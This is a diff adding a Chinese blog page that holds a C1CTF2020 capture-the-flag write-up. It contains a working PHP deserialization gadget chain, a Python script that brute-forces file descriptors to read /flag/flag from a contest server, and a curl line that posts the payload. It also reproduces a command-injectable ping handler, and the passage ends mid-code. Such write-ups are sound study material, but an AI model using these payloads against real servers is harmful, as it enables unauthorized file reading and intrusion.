@@ -1,0 +1,841 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="[C1CTF2020]wp合工大的萌新赛，我是超级垃圾呜呜呜，萌新赛都打的这么吃力也学到不少东西 php_tricks就是个基础反序列化入门，反序列化一个POST的data，然后还需要file_get_contents反序列化类里的一个成员的值符合条件我是垃圾这都不会。。。一开始想的是php:&#x2F;&#x2F;input，但是这样显然和POST的数据冲突，查了很多奇怪的知识发现都不行，但是学">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[C1CTF2020]wp">
+<meta property="og:url" content="https://blog.z3ratu1.cn/[C1CTF2020]wp.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="[C1CTF2020]wp合工大的萌新赛，我是超级垃圾呜呜呜，萌新赛都打的这么吃力也学到不少东西 php_tricks就是个基础反序列化入门，反序列化一个POST的data，然后还需要file_get_contents反序列化类里的一个成员的值符合条件我是垃圾这都不会。。。一开始想的是php:&#x2F;&#x2F;input，但是这样显然和POST的数据冲突，查了很多奇怪的知识发现都不行，但是学">
+<meta property="og:locale">
+<meta property="article:published_time" content="2020-12-09T07:15:03.000Z">
+<meta property="article:modified_time" content="2020-12-09T11:17:59.228Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="SQLI">
+<meta property="article:tag" content="pickle">
+<meta property="article:tag" content="AES">
+<meta property="article:tag" content="命令注入">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/[C1CTF2020]wp.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>[C1CTF2020]wp | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/[C1CTF2020]wp.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [C1CTF2020]wp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-12-09 15:15:03 / 修改时间：19:17:59" itemprop="dateCreated datePublished" datetime="2020-12-09T15:15:03+08:00">2020-12-09</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/%5BC1CTF2020%5Dwp.html" class="post-meta-item leancloud_visitors" data-flag-title="[C1CTF2020]wp" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/%5BC1CTF2020%5Dwp.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/%5BC1CTF2020%5Dwp.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="C1CTF2020-wp"><a href="#C1CTF2020-wp" class="headerlink" title="[C1CTF2020]wp"></a>[C1CTF2020]wp</h1><p>合工大的萌新赛，我是超级垃圾呜呜呜，萌新赛都打的这么吃力<br>也学到不少东西</p>
+<h2 id="php-tricks"><a href="#php-tricks" class="headerlink" title="php_tricks"></a>php_tricks</h2><p>就是个基础反序列化入门，反序列化一个POST的data，然后还需要file_get_contents反序列化类里的一个成员的值符合条件<br>我是垃圾这都不会。。。一开始想的是php:&#x2F;&#x2F;input，但是这样显然和POST的数据冲突，查了很多奇怪的知识发现都不行，但是学到了一点，PHP只会在content-type为urlencode和一个什么的时候才把httpbody的数据放进POST里面，所以有时候忘加content-type打不通，最后发现file_get_content甚至可以用http协议读远程文件。。。。学习了</p>
+<h2 id="php-tricks’-revenge"><a href="#php-tricks’-revenge" class="headerlink" title="php_tricks’ revenge"></a>php_tricks’ revenge</h2><p>还是贴一下源码</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token punctuation">{</span>
+    <span class="token keyword">private</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$prop</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$prop</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+
+<span class="token keyword">class</span> <span class="token class-name">Config</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$config</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$handler</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$handler</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token variable">$handler</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handler</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$k</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// fopen($k);</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+
+<span class="token keyword">class</span> <span class="token class-name">Trigger</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token string">'flag'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token string">'Not allowed!'</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Config</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Trigger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$d</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Trigger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
+<span class="token variable">$d</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token string">"/proc/self/fd/0"</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$d</span><span class="token punctuation">;</span>
+
+<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"/flag/flag"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"ccc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">// echo urlencode(serialize($c));</span>
+</code></pre>
+<p>思路其实很简单，Trigger的__toString肯定是在echo反序列化那里触发，Config还有一个__wakeup也是一个触发点，File直接打开一个handler，名字提醒也很直接，flag在&#x2F;flag&#x2F;flag，但是唯一能拿到文件内容的file_get_contents前面有一个过滤ban了flag<br>所以肯定是通过File打开flag文件留下一个fd，然后从proc里面去读</p>
+<p>很简单啊，就是有一个问题，Trigger只有一个成员变量，这个成员变量肯定得最后是一个文件名，而上面两个类肯定返回不了文件名，那咋整？<br>此处可以体现我的傻逼<br>一开始想的是整一个array进行反序列化，结果发现echo的时候直接输出的是Array，没触发到Trigger，那就必然只能走Trigger了，但是Trigger不能带数据啊，怎么办？<br>然后想出了奇怪的利用，能不能在Config的数组里面把一个类对象作为键，然后报错告诉我显然不行，至少得是字符串作为键，我是垃圾呜呜呜<br>然后发现文件不存在还会报错，最后又想着能不能通过报错带一个信息出来（最后发现我不知道为什么这么简单一个题能想的这么复杂）</p>
+<p>最后的最后，发现可以无中生有的编造一个属性出来，直接多带一个类进去反序列化。。。。<br>然后我还提出了愚蠢的嵌套Trigger操作，让里层Trigger读出flag返回出来再让外层Trigger去读flag值对应的文件读不到报错获取flag。。。。完全没有意义啊，我是垃圾</p>
+<p>就着上面这个憨批payload也能打通，就是显得比较愚蠢罢了<br>然后就是fd得猜，手动爆破，rmb神仙就比较nb，直接在PHP里面生成payload然后用curl发出去了，一体化攻击。很好的操作，偷学一下<code>system(&#39;curl &quot;http://8.136.131.7:30683&quot; -d &quot;data=&#39;.$data.&#39;&quot;&#39;)</code></p>
+<p>然后我憨批的把payload拿到python里面写脚本，踩了另外一个坑<br>因为存在private属性所以有不可见字符，常理都是编码打过去，所以我先在PHP里面输出了url编码过的payload，在放到python里面去遍历fd，结果半天打不通，最后去查文档，发现是requests.post还会自动给你加一遍url编码，二次编码了就，content-type默认是urlencode那个，呜呜<br>还有一个不方便的就是fd遍历的时候要手改字符串长度</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://8.136.131.7:30683/"</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    trigger <span class="token operator">=</span> <span class="token string">'O:7:"Trigger":2:{s:8:"filename";O:7:"Trigger":1:{s:8:"filename";s:16:"/proc/self/fd/'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'";}s:1:"a";O:6:"Config":2:{s:6:"config";a:1:{s:10:"/flag/flag";s:3:"ccc";}s:15:"\0Config\0handler";O:4:"File":1:{s:10:"\0File\0file";N;}}}'</span>
+    payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"data"</span><span class="token punctuation">:</span> trigger<span class="token punctuation">}</span>
+    <span class="token comment" spellcheck="true"># print(payload)</span>
+    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token string">"CTF"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+</code></pre>
+<h3 id="反序列化顺序"><a href="#反序列化顺序" class="headerlink" title="反序列化顺序"></a>反序列化顺序</h3><p>小小的点，刚写这个的时候才想起来这个东西，如果我先去file_get_contents，再去fopen，那肯定fd没打开就读不到，所以得保证事件发生的先后，所以，欠考虑了，这里反序列化的顺序是没问题的，因为先触发wakeup这个方法，一反序列化就触发，而toString在反序列化结束之后echo才被触发，自然是先打开fd再去读取了</p>
+<p>不过，要是大家都是同样的触发条件，比如都是wakeup触发，顺序会变成什么样呢？可以用如下垃圾代码进行测试</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">Test</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">class</span> <span class="token class-name">A</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"im A"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">class</span> <span class="token class-name">B</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"im B"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">class</span> <span class="token class-name">C</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"im C"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token variable">$t</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$t</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">c</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
+<span class="token variable">$t</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
+<span class="token variable">$t</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
+
+<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>输出结果为<code>im Aim Bim C</code>调换一下顺序可以知道，反序列化的顺序应该是按照类定义中变量的排列顺序决定的，我们强加的未知属性c也能被反序列化，且在定义变量全部完成反序列化后进行，反序列化顺序与变量的访问控制权限无关(即public,protected,private不影响顺序)</p>
+<p>比赛结束了，因为时间不够所以没看什么题，rmb神仙告诉我环境没关，今天看了一个下午，头被打烂了，事实证明时间给够了也做不出来，但是还是学到了不少东西<br>我是垃圾呜呜呜</p>
+<h2 id="best-toolkit"><a href="#best-toolkit" class="headerlink" title="best_toolkit"></a>best_toolkit</h2><p>头给打烂了，连萌新赛都不会做，对着答案看了一个小时各种调试才看懂发生了什么<br>呜呜<br>提供了ping，MD5，base64这几个功能<br>看js也好抓包也好，能看到请求其实是发送到后端一个api&#x2F;router.php?r&#x3D;xx这样的请求里的，一开始盲测了好久，觉得就ping功能能打，但是打了半天也不知道怎么回事，一开始以为是拼接进system函数，还专门猜了猜怎么实现的base64，最后打半天打不通感觉可能用了escapeshellcmd，最后的最后，发现这个router.php其实是个文件包含。。。。读了三个源码，除了ping都是直接PHP函数实现的，我就说怎么测半天测不出来。。。。</p>
+<p>贴一下源码</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+
+<span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+<span class="token variable">$fullcommand</span> <span class="token operator">=</span> <span class="token string">"ping -c 1 "</span> <span class="token punctuation">.</span> <span class="token variable">$addr</span><span class="token punctuation">;</span>
+
+<span class="token variable">$fullcommand</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"\;"</span><span class="token punctuation">,</span> <span class="token string">"%%%%%"</span><span class="token punctuation">,</span> <span class="token variable">$fullcommand</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$fullcommand_array</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">,</span> <span class="token variable">$fullcommand</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$fullcommand</span> <span class="token operator">=</span> <span class="token variable">$fullcommand_array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$fullcommand</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"%%%%%"</span><span class="token punctuation">,</span> <span class="token string">"\;"</span><span class="token punctuation">,</span> <span class="token variable">$fullcommand</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">// Grab the current value of $fullcommand and store it to display in the run check command results box in order to maintain obfuscation</span>
+<span class="token variable">$displaycommand</span> <span class="token operator">=</span> <span class="token variable">$fullcommand</span><span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">// Fix escaping for quoted sections</span>
+<span class="token variable">$escaped_cmd</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$fullcommand</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">// Build array of quoted parts, and the same escaped</span>
+<span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">'/\'[^\']+\'/'</span><span class="token punctuation">,</span> <span class="token variable">$fullcommand</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$matches</span> <span class="token operator">=</span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$quoted</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$matches</span> <span class="token keyword">as</span> <span class="token variable">$match</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$quoted</span><span class="token punctuation">[</span><span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$match</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token comment" spellcheck="true">// Replace sections that were single quoted with original content</span>
+<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$quoted</span> <span class="token keyword">as</span> <span class="token variable">$search</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$replace</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
